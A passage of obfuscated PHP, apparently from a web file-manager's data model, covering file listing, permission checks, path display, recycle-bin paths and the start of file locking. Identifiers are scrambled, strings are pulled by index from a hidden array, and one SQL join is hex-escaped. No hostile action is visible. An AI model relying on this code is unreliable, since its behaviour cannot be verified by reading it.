$Ğ¦¸îÌÎ[511]; $Õ‰˜ï‚è = Model($Ğ¦¸îÌÎ[512])->field($¼õ‹‡è–)->where($ïØóÃÒô)->select(); $Õ‰˜ï‚è = array_to_keyvalue($Õ‰˜ï‚è, $Ğ¦¸îÌÎ[509]); $Ñ¹ø—š = Model($Ğ¦¸îÌÎ[513])->field($Ğ¦¸îÌÎ[514])->where($ïØóÃÒô)->select(); $Ñ¹ø—š = $Ñ¹ø—š ? $Ñ¹ø—š : array(); $ ö·ß‰Ë = array(); foreach ($Ñ¹ø—š as $æ±…ğÇ) { if (!isset($ ö·ß‰Ë[$æ±…ğÇ[$Ğ¦¸îÌÎ[509]]])) { $ ö·ß‰Ë[$æ±…ğÇ[$Ğ¦¸îÌÎ[509]]] = array(); } $ ö·ß‰Ë[$æ±…ğÇ[$Ğ¦¸îÌÎ[509]]][$æ±…ğÇ[$Ğ¦¸îÌÎ[94]]] = $æ±…ğÇ[$Ğ¦¸îÌÎ[418]]; } foreach ($±ê¡¢Œç as &$Ê–³Í³µ) { $ó©ü¥­ = $Ê–³Í³µ[$Ğ¦¸îÌÎ[509]]; if (!$ó©ü¥­ || !is_array($Õ‰˜ï‚è[$ó©ü¥­])) { continue; } $ïşÒï¾ = $Õ‰˜ï‚è[$ó©ü¥­]; $ïşÒï¾[$Ğ¦¸îÌÎ[76]] = $Ê–³Í³µ[$Ğ¦¸îÌÎ[76]]; $ïşÒï¾[$Ğ¦¸îÌÎ[32]] = $Ê–³Í³µ[$Ğ¦¸îÌÎ[32]]; if (!isset(self::$cacheFileInfo[$Ğ¦¸îÌÎ[515] . $ó©ü¥­])) { self::$cacheFileInfo[$Ğ¦¸îÌÎ[515] . $ó©ü¥­] = array_merge(array(), $ïşÒï¾); } unset($Õ‰˜ï‚è[$ó©ü¥­][$Ğ¦¸îÌÎ[84]]); $¼ñ½éÜ± = is_array($ ö·ß‰Ë[$ó©ü¥­]) ? $ ö·ß‰Ë[$ó©ü¥­] : array(); $Ê–³Í³µ[$Ğ¦¸îÌÎ[516]] = array_merge($¼ñ½éÜ±, $Õ‰˜ï‚è[$ó©ü¥­]); if (isset($Ê–³Í³µ[$Ğ¦¸îÌÎ[516]][$Ğ¦¸îÌÎ[171]])) { $Ê–³Í³µ[$Ğ¦¸îÌÎ[171]] = json_decode($Ê–³Í³µ[$Ğ¦¸îÌÎ[516]][$Ğ¦¸îÌÎ[171]], !0); unset($Ê–³Í³µ[$Ğ¦¸îÌÎ[516]][$Ğ¦¸îÌÎ[171]]); } } unset($Ê–³Í³µ); } protected function _listAppendSourceInfo(&$…£—±˜, $ÒÍ‘‘î¬) { $œÏ™ïÅ =& $_SERVER[—ÌÒğš÷]; $¨Ò¨™Ş = Model($œÏ™ïÅ[517])->listData(); $ˆ¸¬Ûé = Model($œÏ™ïÅ[467])->listData(); $±¶¨ôªú = Model($œÏ™ïÅ[457])->listData(); $Ö™İ³ê = Model($œÏ™ïÅ[518])->listSimple(); $ü¨†Ä±§ = array_to_keyvalue($¨Ò¨™Ş, $œÏ™ïÅ[443]); $àØ¾µ…ã = array_to_keyvalue_group($ˆ¸¬Ûé, $œÏ™ïÅ[84], $œÏ™ïÅ[468]); $áËŸ¨×™ = array_to_keyvalue($±¶¨ôªú, $œÏ™ïÅ[84]); $œ¯Ş”¨× = array_to_keyvalue_group($Ö™İ³ê, $œÏ™ïÅ[181]); foreach ($…£—±˜ as &$¿ÓÏä˜™) { $¿ÓÏä˜™[$œÏ™ïÅ[87]] = array($œÏ™ïÅ[519] => 0, $œÏ™ïÅ[520] => 0, $œÏ™ïÅ[521] => 0); if (isset($áËŸ¨×™[$¿ÓÏä˜™[$œÏ™ïÅ[181]]])) { $¿ÓÏä˜™[$œÏ™ïÅ[87]][$œÏ™ïÅ[522]] = 1; $¿ÓÏä˜™[$œÏ™ïÅ[87]][$œÏ™ïÅ[523]] = $áËŸ¨×™[$¿ÓÏä˜™[$œÏ™ïÅ[181]]][$œÏ™ïÅ[32]]; } if ($àØ¾µ…ã && $ü¨†Ä±§ && isset($àØ¾µ…ã[$¿ÓÏä˜™[$œÏ™ïÅ[181]]])) { $¿ÓÏä˜™[$œÏ™ïÅ[87]][$œÏ™ïÅ[524]] = array(); foreach ($àØ¾µ…ã[$¿ÓÏä˜™[$œÏ™ïÅ[181]]] as $äİ³§ŒÉ) { $ÇØ²è§… = $ü¨†Ä±§[$äİ³§ŒÉ]; $¿ÓÏä˜™[$œÏ™ïÅ[87]][$œÏ™ïÅ[524]][] = array($œÏ™ïÅ[525] => $ÇØ²è§…[$œÏ™ïÅ[443]], $œÏ™ïÅ[462] => $ÇØ²è§…[$œÏ™ïÅ[32]], $œÏ™ïÅ[526] => $ÇØ²è§…[$œÏ™ïÅ[527]]); } } if ($œ¯Ş”¨× && isset($œ¯Ş”¨×[$¿ÓÏä˜™[$œÏ™ïÅ[181]]])) { $¿ÓÏä˜™[$œÏ™ïÅ[87]][$œÏ™ïÅ[528]] = array(); foreach ($œ¯Ş”¨×[$¿ÓÏä˜™[$œÏ™ïÅ[181]]] as $Óû –Êû) { $•Ó¿Õ¿Â = $œÏ™ïÅ[529]; if ($Óû –Êû[$œÏ™ïÅ[530]] == $œÏ™ïÅ[88]) { $•Ó¿Õ¿Â .= $œÏ™ïÅ[531]; } $¿ÓÏä˜™[$œÏ™ïÅ[87]][$œÏ™ïÅ[528]] = array_field_key($Óû –Êû, explode($œÏ™ïÅ[50], $•Ó¿Õ¿Â)); } } } unset($¿ÓÏä˜™); return $…£—±˜; } protected function _listAppendChildren(&$ùÑ¤Ö²Õ, $Ùàš“®Î) { $–×«Ã½ =& $_SERVER[—ÌÒğš÷]; $Ö¯Öâ›¥ = array(); $ÙçªßÖ = array($–×«Ã½[223] => 0, $–×«Ã½[224] => 0); foreach ($ùÑ¤Ö²Õ as &$éòÀ”ºñ) { if (!$éòÀ”ºñ[$–×«Ã½[453]]) { continue; } $Ö¯Öâ›¥[] = $éòÀ”ºñ[$–×«Ã½[181]]; } unset($éòÀ”ºñ); if (!$Ö¯Öâ›¥) { return; } $ ù›ÇˆÒ = array($–×«Ã½[180] => array($–×«Ã½[7], $Ö¯Öâ›¥), $–×«Ã½[473] => 0); $Ú™«é—Î = array($–×«Ã½[180], $–×«Ã½[453], $–×«Ã½[532] => $–×«Ã½[533]); $ÕğÎË» = $this->field($Ú™«é—Î)->where($ ù›ÇˆÒ)->group($–×«Ã½[534])->select(); $Ë÷®­¨ = array(); foreach ($ÕğÎË» as $µš×Ò­°) { $áßºêéÅ = $µš×Ò­°[$–×«Ã½[180]]; $üÙ Ò¿ = $µš×Ò­°[$–×«Ã½[453]] == $–×«Ã½[88] ? $–×«Ã½[224] : $–×«Ã½[223]; if (!isset($Ë÷®­¨[$áßºêéÅ])) { $Ë÷®­¨[$áßºêéÅ] = array($–×«Ã½[223] => 0, $–×«Ã½[224] => 0); } $Ë÷®­¨[$áßºêéÅ][$üÙ Ò¿] += $µš×Ò­°[$–×«Ã½[533]]; } foreach ($ùÑ¤Ö²Õ as &$éòÀ”ºñ) { if (!$éòÀ”ºñ[$–×«Ã½[453]]) { continue; } $Ÿ¦¹ñ›û = is_array($Ë÷®­¨[$éòÀ”ºñ[$–×«Ã½[181]]]) ? $Ë÷®­¨[$éòÀ”ºñ[$–×«Ã½[181]]] : $ÙçªßÖ; $éòÀ”ºñ[$–×«Ã½[224]] = $Ÿ¦¹ñ›û[$–×«Ã½[224]]; $éòÀ”ºñ[$–×«Ã½[223]] = $Ÿ¦¹ñ›û[$–×«Ã½[223]]; unset($éòÀ”ºñ[$–×«Ã½[454]]); } unset($éòÀ”ºñ); } protected function _listAppendAuth(&$ÜûÃ‹¿Ä) { $´îÚş =& $_SERVER[—ÌÒğš÷]; $÷Ô–Û¤ = array(); foreach ($ÜûÃ‹¿Ä as $é·øÏá³) { if ($é·øÏá³[$´îÚş[178]] == self::TYPE_GROUP) { $÷Ô–Û¤[] = $é·øÏá³[$´îÚş[181]]; } } if (!$÷Ô–Û¤) { return; } $£ğ¦­¬ı = array_to_keyvalue($ÜûÃ‹¿Ä, $´îÚş[181]); $Áñí¬„† = Model($´îÚş[535])->getSourceList($÷Ô–Û¤, $£ğ¦­¬ı); $ÛÁí² = $GLOBALS[$´îÚş[536]] == 1; foreach ($ÜûÃ‹¿Ä as $¢Â¨ƒØ => &$é·øÏá³) { $é·øÏá³[$´îÚş[455]] = $Áñí¬„†[$é·øÏá³[$´îÚş[181]]]; if (!$é·øÏá³[$´îÚş[455]] && $é·øÏá³[$´îÚş[178]] == self::TYPE_GROUP) { $é·øÏá³[$´îÚş[455]] = Action($´îÚş[537])->pathGroupAuthMake($é·øÏá³[$´îÚş[538]]); if (!$é·øÏá³[$´îÚş[455]] && !$ÛÁí²) { $é·øÏá³[$´îÚş[217]] = !1; $é·øÏá³[$´îÚş[216]] = !1; } } if ($é·øÏá³[$´îÚş[455]]) { $é·øÏá³[$´îÚş[217]] = AuthModel::authCheckEdit($é·øÏá³[$´îÚş[455]][$´îÚş[456]]); $é·øÏá³[$´îÚş[216]] = AuthModel::authCheckView($é·øÏá³[$´îÚş[455]][$´îÚş[456]]); } $this->groupPathDisplay($é·øÏá³); } unset($é·øÏá³); } public function _listAppendAuthSecret(&$¸İÁÙÂª) { $şÁ°êÒ× =& $_SERVER[—ÌÒğš÷]; if (Model($şÁ°êÒ×[476])->get($şÁ°êÒ×[539]) != $şÁ°êÒ×[88]) { return; } static $²ã„€ï† = false; if (!$²ã„€ï†) { $‡¶â¶È = Model($şÁ°êÒ×[540]); $ù³¾üæ = Model($şÁ°êÒ×[541]); $²ã„€ï† = $ù³¾üæ->listData(); $²ã„€ï† = array_to_keyvalue($²ã„€ï†, $şÁ°êÒ×[181]); $ŸÛüß€¯ = json_decode(Model($şÁ°êÒ×[476])->get($şÁ°êÒ×[542]), !0); $ŸÛüß€¯ = array_to_keyvalue($ŸÛüß€¯, $şÁ°êÒ×[443]); foreach ($²ã„€ï† as $’ë³çÅ => $µøƒı»œ) { $¡Ùş‘‰ = $ŸÛüß€¯[$µøƒı»œ[$şÁ°êÒ×[543]]]; if (!$¡Ùş‘‰) { $ù³¾üæ->remove($µøƒı»œ[$şÁ°êÒ×[443]]); unset($²ã„€ï†[$’ë³çÅ]); continue; } $ØÇ¹‚Ë = $‡¶â¶È->listData($¡Ùş‘‰[$şÁ°êÒ×[455]]); if (!$ØÇ¹‚Ë) { $ù³¾üæ->remove($µøƒı»œ[$şÁ°êÒ×[443]]); unset($²ã„€ï†[$’ë³çÅ]); continue; } $µøƒı»œ[$şÁ°êÒ×[455]] = $ØÇ¹‚Ë; $µøƒı»œ[$şÁ°êÒ×[544]] = $¡Ùş‘‰; $µøƒı»œ[$şÁ°êÒ×[545]] = Model($şÁ°êÒ×[546])->getInfoSimpleOuter($µøƒı»œ[$şÁ°êÒ×[495]]); $²ã„€ï†[$’ë³çÅ] = $µøƒı»œ; } } $™“‹À‘Á = USER_ID; $İÑôé– = array(); $Ó¶—Çãó = $this->_listAppendPath($İÑôé–, !0); foreach ($¸İÁÙÂª as $’ë³çÅ => &$µøƒı»œ) { if (!is_array($µøƒı»œ[$şÁ°êÒ×[455]])) { continue; } if ($µøƒı»œ[$şÁ°êÒ×[178]] != $şÁ°êÒ×[547]) { continue; } if (isset($²ã„€ï†[$µøƒı»œ[$şÁ°êÒ×[181]]])) { $«ÁÇ²½¶ = $²ã„€ï†[$µøƒı»œ[$şÁ°êÒ×[181]]]; if (!is_array($µøƒı»œ[$şÁ°êÒ×[507]])) { $µøƒı»œ[$şÁ°êÒ×[507]] = array(); } $µøƒı»œ[$şÁ°êÒ×[507]][$şÁ°êÒ×[548]] = $«ÁÇ²½¶[$şÁ°êÒ×[543]]; $µøƒı»œ[$şÁ°êÒ×[455]][$şÁ°êÒ×[549]] = $«ÁÇ²½¶; $µøƒı»œ[$şÁ°êÒ×[455]][$şÁ°êÒ×[550]] = $µøƒı»œ[$şÁ°êÒ×[551]]; $µøƒı»œ[$şÁ°êÒ×[455]][$şÁ°êÒ×[552]] = $şÁ°êÒ×[88]; if ($«ÁÇ²½¶[$şÁ°êÒ×[495]] != $™“‹À‘Á) { $µøƒı»œ[$şÁ°êÒ×[455]][$şÁ°êÒ×[456]] = $µøƒı»œ[$şÁ°êÒ×[455]][$şÁ°êÒ×[456]] & $«ÁÇ²½¶[$şÁ°êÒ×[455]][$şÁ°êÒ×[455]]; } continue; } $öí™é‹Ô = $this->parentLevelArray($µøƒı»œ[$şÁ°êÒ×[553]]); $•ã‘¦®õ = array_reverse($öí™é‹Ô); foreach ($•ã‘¦®õ as $ĞÈÆæ—® => $Çş‘ê­¦) { if (!isset($²ã„€ï†[$Çş‘ê­¦])) { continue; } $«ÁÇ²½¶ = $²ã„€ï†[$Çş‘ê­¦]; $µøƒı»œ[$şÁ°êÒ×[455]][$şÁ°êÒ×[549]] = $«ÁÇ²½¶; if ($«ÁÇ²½¶[$şÁ°êÒ×[495]] != $™“‹À‘Á) { $µøƒı»œ[$şÁ°êÒ×[455]][$şÁ°êÒ×[456]] = $µøƒı»œ[$şÁ°êÒ×[455]][$şÁ°êÒ×[456]] & $«ÁÇ²½¶[$şÁ°êÒ×[455]][$şÁ°êÒ×[455]]; } $­ç¨Â¢¦ = $şÁ°êÒ×[12]; $íï¼¾ôË = count($öí™é‹Ô) - $ĞÈÆæ—®; for ($åÍôƒµƒ = 0; $åÍôƒµƒ < $íï¼¾ôË; $åÍôƒµƒ++) { if (!isset($Ó¶—Çãó[$öí™é‹Ô[$åÍôƒµƒ]])) { $­ç¨Â¢¦ = $şÁ°êÒ×[12]; break; } $­ç¨Â¢¦ = $­ç¨Â¢¦ . rtrim($Ó¶—Çãó[$öí™é‹Ô[$åÍôƒµƒ]], $şÁ°êÒ×[8]) . $şÁ°êÒ×[8]; } $µøƒı»œ[$şÁ°êÒ×[455]][$şÁ°êÒ×[550]] = rtrim($­ç¨Â¢¦, $şÁ°êÒ×[8]) . $şÁ°êÒ×[8]; break; } } unset($µøƒı»œ); } public function groupPathDisplay(&$¿ß³—ü©) { $¥ó´Î©Ú =& $_SERVER[—ÌÒğš÷]; if ($¿ß³—ü©[$¥ó´Î©Ú[178]] != self::TYPE_GROUP) { return; } $ü¥ªé©Ã = Model($¥ó´Î©Ú[554])->getInfo($¿ß³—ü©[$¥ó´Î©Ú[538]]); $½Òâ¼³¹ = $this->parentLevelArray($ü¥ªé©Ã[$¥ó´Î©Ú[553]]); $ğ°ÏËÚ¸ = $¥ó´Î©Ú[12]; foreach ($½Òâ¼³¹ as $ÙÉ¥©ĞÎ) { $Êª£‰” = Model($¥ó´Î©Ú[554])->getInfo($ÙÉ¥©ĞÎ); $ğ°ÏËÚ¸ .= $Êª£‰”[$¥ó´Î©Ú[87]][$¥ó´Î©Ú[181]] . $¥ó´Î©Ú[50]; } $¿ß³—ü©[$¥ó´Î©Ú[555]] = $ü¥ªé©Ã[$¥ó´Î©Ú[180]]; $¿ß³—ü©[$¥ó´Î©Ú[556]] = $ü¥ªé©Ã[$¥ó´Î©Ú[553]]; $¿ß³—ü©[$¥ó´Î©Ú[557]] = $ü¥ªé©Ã[$¥ó´Î©Ú[558]]; $¿ß³—ü©[$¥ó´Î©Ú[559]] = $ğ°ÏËÚ¸ . $ü¥ªé©Ã[$¥ó´Î©Ú[87]][$¥ó´Î©Ú[181]]; } protected function _listAppendPath(&$ÜÓÑƒ§ò, $»ôÏ¾Ú = false) { $£Í’Ñ©ã =& $_SERVER[—ÌÒğš÷]; static $Ø‰ÙšÕŸ = array(); $÷»´àºı = array(); $Ù¦Ó¯‰¹ = array(); if ($»ôÏ¾Ú) { return $Ø‰ÙšÕŸ; } foreach ($ÜÓÑƒ§ò as &$ÃûÒÊ›) { $Ìâ²îÃ = $ÃûÒÊ›[$£Í’Ñ©ã[181]]; if ($ÃûÒÊ›[$£Í’Ñ©ã[453]] == $£Í’Ñ©ã[88] && $ÃûÒÊ›[$£Í’Ñ©ã[180]] != 0) { $Ø‰ÙšÕŸ[$Ìâ²îÃ] = $ÃûÒÊ›[$£Í’Ñ©ã[32]]; } if ($ÃûÒÊ›[$£Í’Ñ©ã[453]] == $£Í’Ñ©ã[88] && $ÃûÒÊ›[$£Í’Ñ©ã[180]] == 0) { $Ø‰ÙšÕŸ[$Ìâ²îÃ] = $this->_listAppendPathRoot($ÃûÒÊ›, array()); } if (isset($Ù¦Ó¯‰¹[$ÃûÒÊ›[$£Í’Ñ©ã[553]]])) { continue; } $Ù¦Ó¯‰¹[$ÃûÒÊ›[$£Í’Ñ©ã[553]]] = !0; $ı†Òƒ— = $this->parentLevelArray($ÃûÒÊ›[$£Í’Ñ©ã[553]]); foreach ($ı†Òƒ— as $£•¦¸º => $¯ªËôó) { if (isset($Ø‰ÙšÕŸ[$¯ªËôó])) { continue; } if ($£•¦¸º == 0) { $Ø‰ÙšÕŸ[$¯ªËôó] = $this->_listAppendPathRoot($ÃûÒÊ›, $ı†Òƒ—); } if ($£•¦¸º != 0) { $÷»´àºı[] = $¯ªËôó; } } } unset($ÃûÒÊ›); $÷»´àºı = array_unique($÷»´àºı); if (count($÷»´àºı) > 0) { $€è¾ÁŸ = array($£Í’Ñ©ã[459] => array($£Í’Ñ©ã[460], $÷»´àºı)); if (count($÷»´àºı) == 1) { $Ù€ÚÈà = $this->sourceInfo($÷»´àºı[0]); $Šç°ë¿ = is_array($Ù€ÚÈà) ? array($Ù€ÚÈà) : !1; } else { $Šç°ë¿ = $this->field($£Í’Ñ©ã[560])->where($€è¾ÁŸ)->select(); } if (!$Šç°ë¿) { $Šç°ë¿ = array(); } foreach ($Šç°ë¿ as $êñÆ²¥¥) { $Ø‰ÙšÕŸ[$êñÆ²¥¥[$£Í’Ñ©ã[181]]] = $êñÆ²¥¥[$£Í’Ñ©ã[32]]; } } $¸İ®âÖ† = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $üİ³à = array(); foreach ($ÜÓÑƒ§ò as &$ÃûÒÊ›) { $Òçóà· = $ÃûÒÊ›[$£Í’Ñ©ã[553]]; $¬§ÑßØ = $£Í’Ñ©ã[12]; if (isset($üİ³à[$Òçóà·])) { $¬§ÑßØ = $üİ³à[$Òçóà·]; } else { $ı†Òƒ— = $this->parentLevelArray($ÃûÒÊ›[$£Í’Ñ©ã[553]]); foreach ($ı†Òƒ— as $£•¦¸º => $¯ªËôó) { if (isset($Ø‰ÙšÕŸ[$¯ªËôó])) { $¬§ÑßØ .= $Ø‰ÙšÕŸ[$¯ªËôó] . $£Í’Ñ©ã[8]; } } $üİ³à[$Òçóà·] = $¬§ÑßØ; } $¬§ÑßØ .= $ÃûÒÊ›[$£Í’Ñ©ã[32]]; if ($ÃûÒÊ›[$£Í’Ñ©ã[453]] == $£Í’Ñ©ã[88]) { $¬§ÑßØ .= $£Í’Ñ©ã[8]; } $ÃûÒÊ›[$£Í’Ñ©ã[551]] = str_replace($£Í’Ñ©ã[561], $£Í’Ñ©ã[8], $¬§ÑßØ); if ($ÃûÒÊ›[$£Í’Ñ©ã[180]] == $£Í’Ñ©ã[212]) { $ÃûÒÊ›[$£Í’Ñ©ã[32]] = trim($Ø‰ÙšÕŸ[$ÃûÒÊ›[$£Í’Ñ©ã[181]]], $£Í’Ñ©ã[8]); $ÃûÒÊ›[$£Í’Ñ©ã[551]] = $ÃûÒÊ›[$£Í’Ñ©ã[32]] . $£Í’Ñ©ã[8]; } if (intval($ÃûÒÊ›[$£Í’Ñ©ã[178]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ÃûÒÊ›, $ı†Òƒ—, $¸İ®âÖ†); } } unset($ÃûÒÊ›); return $ÜÓÑƒ§ò; } private function _listAppendPathRecycle(&$é•ô·õ×, $°š²€îÃ, $¹À…ß™É) { $¾ñÒ±¨Î =& $_SERVER[—ÌÒğš÷]; if (!in_array($¹À…ß™É, $°š²€îÃ) && $é•ô·õ×[$¾ñÒ±¨Î[181]] != $¹À…ß™É) { return; } $ãñÎÈä× = explode($¾ñÒ±¨Î[8], trim($é•ô·õ×[$¾ñÒ±¨Î[551]], $¾ñÒ±¨Î[8])); $ñ¥…ÑÕÍ = implode($¾ñÒ±¨Î[8], array_slice($ãñÎÈä×, 2)); $é•ô·õ×[$¾ñÒ±¨Î[551]] = $¾ñÒ±¨Î[8] . LNG($¾ñÒ±¨Î[562]) . $¾ñÒ±¨Î[8] . ltrim($ñ¥…ÑÕÍ, $¾ñÒ±¨Î[8]); $é•ô·õ×[$¾ñÒ±¨Î[553]] = $¾ñÒ±¨Î[563] . implode($¾ñÒ±¨Î[50], array_slice($°š²€îÃ, 1)) . $¾ñÒ±¨Î[50]; if ($é•ô·õ×[$¾ñÒ±¨Î[181]] == $¹À…ß™É) { $é•ô·õ×[$¾ñÒ±¨Î[553]] = $¾ñÒ±¨Î[563]; $é•ô·õ×[$¾ñÒ±¨Î[180]] = $¾ñÒ±¨Î[212]; $é•ô·õ×[$¾ñÒ±¨Î[32]] = LNG($¾ñÒ±¨Î[562]); } $é•ô·õ×[$¾ñÒ±¨Î[564]] = $¾ñÒ±¨Î[565]; } protected function _listAppendPathRoot(&$†ü–°‹À, $¹×ÊßÕ€) { $©ş±Ÿ«­ =& $_SERVER[—ÌÒğš÷]; static $æ¢Ì½«Ê = false; $……ŸÀß² = $©ş±Ÿ«­[12]; if ($†ü–°‹À[$©ş±Ÿ«­[178]] == self::TYPE_USER) { if ($†ü–°‹À[$©ş±Ÿ«­[538]] == USER_ID) { $……ŸÀß² = LNG($©ş±Ÿ«­[566]); if ($æ¢Ì½«Ê === !1) { $¯é±™È‘ = Model($©ş±Ÿ«­[567])->getInfoFull(USER_ID); $æ¢Ì½«Ê = _get($¯é±™È‘, $©ş±Ÿ«­[568], $©ş±Ÿ«­[12]); } if ($¹×ÊßÕ€ && $¹×ÊßÕ€[0] == $æ¢Ì½«Ê || !$¹×ÊßÕ€ && $†ü–°‹À[$©ş±Ÿ«­[181]] == $æ¢Ì½«Ê) { $……ŸÀß² = LNG($©ş±Ÿ«­[569]); $†ü–°‹À[$©ş±Ÿ«­[570]] = $©ş±Ÿ«­[571]; } if (!$¹×ÊßÕ€) { $†ü–°‹À[$©ş±Ÿ«­[32]] = $……ŸÀß²; } } else { $†ü–°‹À[$©ş±Ÿ«­[572]] = Model($©ş±Ÿ«­[546])->getInfoSimpleOuter($†ü–°‹À[$©ş±Ÿ«­[538]]); $……ŸÀß² = LNG($©ş±Ÿ«­[573]) . $©ş±Ÿ«­[163] . $†ü–°‹À[$©ş±Ÿ«­[572]][$©ş±Ÿ«­[32]] . $©ş±Ÿ«­[165]; } } else { if ($†ü–°‹À[$©ş±Ÿ«­[178]] == self::TYPE_GROUP) { $Å¹‘îÄ¾ = Model($©ş±Ÿ«­[554])->getInfoSimple($†ü–°‹À[$©ş±Ÿ«­[538]]); $……ŸÀß² = $Å¹‘îÄ¾[$©ş±Ÿ«­[32]]; } else { if ($†ü–°‹À[$©ş±Ÿ«­[178]] == self::TYPE_SYSTEM) { $……ŸÀß² = $©ş±Ÿ«­[574]; } } } $……ŸÀß² = $……ŸÀß² ? $©ş±Ÿ«­[8] . $……ŸÀß² . $©ş±Ÿ«­[8] : $©ş±Ÿ«­[8]; return $……ŸÀß²; } protected function _listAppendUser(&$ó‰…¿Ñ) { $êøñÜú¥ =& $_SERVER[—ÌÒğš÷]; $ÛÍè…±æ = array_to_keyvalue($ó‰…¿Ñ, $êøñÜú¥[12], $êøñÜú¥[495]); $¡Óö’áÑ = array_to_keyvalue($ó‰…¿Ñ, $êøñÜú¥[12], $êøñÜú¥[497]); $Û‹ùü … = array_merge($ÛÍè…±æ, $¡Óö’áÑ); $´ĞâÇ´ù = Model($êøñÜú¥[567])->userListInfo($Û‹ùü …); foreach ($ó‰…¿Ñ as &$Ó”İÁÚ‹) { $…ì£ì×¨ = $Ó”İÁÚ‹[$êøñÜú¥[495]]; $Ó”İÁÚ‹[$êøñÜú¥[495]] = $´ĞâÇ´ù[$…ì£ì×¨] ? $´ĞâÇ´ù[$…ì£ì×¨] : !1; $…ì£ì×¨ = $Ó”İÁÚ‹[$êøñÜú¥[497]]; $Ó”İÁÚ‹[$êøñÜú¥[497]] = $´ĞâÇ´ù[$…ì£ì×¨] ? $´ĞâÇ´ù[$…ì£ì×¨] : !1; if (isset($Ó”İÁÚ‹[$êøñÜú¥[507]]) && $Ó”İÁÚ‹[$êøñÜú¥[507]][$êøñÜú¥[575]]) { $­²‰ŒàÍ = $GLOBALS[$êøñÜú¥[6]][$êøñÜú¥[89]][$êøñÜú¥[576]]; if ($Ó”İÁÚ‹[$êøñÜú¥[507]][$êøñÜú¥[577]] <= time() - $­²‰ŒàÍ) { $this->metaSet($Ó”İÁÚ‹[$êøñÜú¥[181]], $êøñÜú¥[575], null); $this->metaSet($Ó”İÁÚ‹[$êøñÜú¥[181]], $êøñÜú¥[577], null); unset($Ó”İÁÚ‹[$êøñÜú¥[507]][$êøñÜú¥[575]]); continue; } $¹¼Ş›‰ˆ = $Ó”İÁÚ‹[$êøñÜú¥[507]][$êøñÜú¥[575]]; $Ó”İÁÚ‹[$êøñÜú¥[507]][$êøñÜú¥[578]] = Model($êøñÜú¥[567])->getInfoSimpleOuter($¹¼Ş›‰ˆ); } } unset($Ó”İÁÚ‹); } public function parentLevelArray($ Š¤ ß) { $±ç“† =& $_SERVER[—ÌÒğš÷]; $ Š¤ ß = explode($±ç“†[50], trim($ Š¤ ß, $±ç“†[50])); return array_remove_value($ Š¤ ß, $±ç“†[212]); } public function listAll($–àåİÑ) { $¥ÍÃğƒ¸ =& $_SERVER[—ÌÒğš÷]; $Àƒôüû£ = $this->sourceInfo($–àåİÑ); $¬ŠÑ ºÑ = array($¥ÍÃğƒ¸[579] => array($¥ÍÃğƒ¸[580], $Àƒôüû£[$¥ÍÃğƒ¸[553]] . $–àåİÑ . $¥ÍÃğƒ¸[581]), $¥ÍÃğƒ¸[582] => 0); $ùŒÀƒñº = $¥ÍÃğƒ¸[583]; $×âğ°™œ = "\114\x45\106\124\40\112\117\x49\116\40{$this->tablePrefix}\151\157\x5f\x66\x69\x6c\145\x20\x66\151\154\145\x20\157\156\x20\x73\157\165\x72\143\x65\56\146\151\154\145\x49\x44\40\x3d\40\x66\151\154\x65\x2e\x66\x69\154\x65\x49\104"; $ÙÜŞÏ½å = $this->alias($¥ÍÃğƒ¸[487])->field($ùŒÀƒñº)->where($¬ŠÑ ºÑ)->join($×âğ°™œ)->select(); $this->_listAppendAuth($ÙÜŞÏ½å); $this->_listAppendUser($ÙÜŞÏ½å); $this->_listAppendPath($ÙÜŞÏ½å); $ÙÜŞÏ½å = array_to_keyvalue($ÙÜŞÏ½å, $¥ÍÃğƒ¸[181]); $æ»¢ßŠ÷ = "\x2f{$Àƒôüû£[$¥ÍÃğƒ¸[32]]}\x2f"; $æ»¢ßŠ÷ = $æ»¢ßŠ÷ == $¥ÍÃğƒ¸[561] ? $¥ÍÃğƒ¸[8] : $æ»¢ßŠ÷; $à•ÔÚ…‡ = array(); foreach ($ÙÜŞÏ½å as $ ¡İÁ›ù => $ÆØÄóØ…) { $š¿š†Ã± = $this->parentLevelArray($ÆØÄóØ…[$¥ÍÃğƒ¸[553]]); array_shift($š¿š†Ã±); $ã…ç¼¯Ç = $æ»¢ßŠ÷; for ($¤¥È¢ ı = 0; $¤¥È¢ ı < count($š¿š†Ã±); $¤¥È¢ ı++) { $ã…ç¼¯Ç .= $ÙÜŞÏ½å[$š¿š†Ã±[$¤¥È¢ ı]][$¥ÍÃğƒ¸[32]] . $¥ÍÃğƒ¸[8]; } $ã…ç¼¯Ç .= $ÆØÄóØ…[$¥ÍÃğƒ¸[32]]; if ($ÆØÄóØ…[$¥ÍÃğƒ¸[453]]) { $ã…ç¼¯Ç .= $¥ÍÃğƒ¸[8]; } $Ü€Åã‡¿ = array($¥ÍÃğƒ¸[463] => str_replace($¥ÍÃğƒ¸[561], $¥ÍÃğƒ¸[8], str_replace($¥ÍÃğƒ¸[561], $¥ÍÃğƒ¸[8], str_replace($¥ÍÃğƒ¸[561], $¥ÍÃğƒ¸[8], $ã…ç¼¯Ç))), $¥ÍÃğƒ¸[584] => intval($ÆØÄóØ…[$¥ÍÃğƒ¸[453]]), $¥ÍÃğƒ¸[585] => intval($ÆØÄóØ…[$¥ÍÃğƒ¸[76]]), $¥ÍÃğƒ¸[85] => intval($ÆØÄóØ…[$¥ÍÃğƒ¸[85]]), $¥ÍÃğƒ¸[87] => $this->pathInfoFilter($ÆØÄóØ…)); if (!$Ü€Åã‡¿[$¥ÍÃğƒ¸[453]]) { $Ü€Åã‡¿[$¥ÍÃğƒ¸[509]] = $ÆØÄóØ…[$¥ÍÃğƒ¸[509]]; } $à•ÔÚ…‡[] = $Ü€Åã‡¿; } $à•ÔÚ…‡ = array_sort_by($à•ÔÚ…‡, $¥ÍÃğƒ¸[84]); return $à•ÔÚ…‡; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($‡œïÆ) { $ŒÑë¸¹Ö =& $_SERVER[—ÌÒğš÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($ŒÑë¸¹Ö[586], $‡œïÆ); $¼óûÔŠ = 1; $this->_lockEvent($‡œïÆ, array($ŒÑë¸¹Ö[587], $ŒÑë¸¹Ö[588]), $¼óûÔŠ); $this->_lockParent($‡œïÆ, array($ŒÑë¸¹Ö[588]), $¼óûÔŠ); $this->_lockEvent($‡œïÆ, array($ŒÑë¸¹Ö[589], $ŒÑë¸¹Ö[590]), $¼óûÔŠ); 